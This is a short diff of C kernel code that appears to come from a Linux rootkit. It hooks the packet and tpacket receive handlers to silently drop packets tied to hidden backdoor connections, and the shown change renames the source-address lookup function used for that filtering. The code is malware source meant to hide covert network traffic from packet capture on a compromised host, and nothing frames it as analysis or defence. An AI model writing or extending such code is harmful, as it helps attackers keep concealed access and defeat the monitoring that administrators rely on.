@@ -682,7 +682,7 @@ static int m_packet_rcv(struct sk_buff *skb, struct net_device *dev,
         struct iphdr *iph = (struct iphdr*)skb_network_header(skb);
         if (kv_for_each_hidden_backdoor_data(_find_packet_rcv_iph_match_cb, skb))
             return 0;
-        else if (kv_bd_search_iph(iph->saddr))
+        else if (kv_bd_search_iph_source(iph->saddr))
             return 0;
         else {
             struct tcphdr *tcp = (struct tcphdr*)skb_transport_header(skb);
@@ -703,7 +703,7 @@ static int m_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
         struct iphdr *iph = (struct iphdr*)skb_network_header(skb);
         if (kv_for_each_hidden_backdoor_data(_find_packet_rcv_iph_match_cb, skb))
             return 0;
-        else if (kv_bd_search_iph(iph->saddr))
+        else if (kv_bd_search_iph_source(iph->saddr))
             return 0;
         else {
             struct tcphdr *tcp = (struct tcphdr*)skb_transport_header(skb);
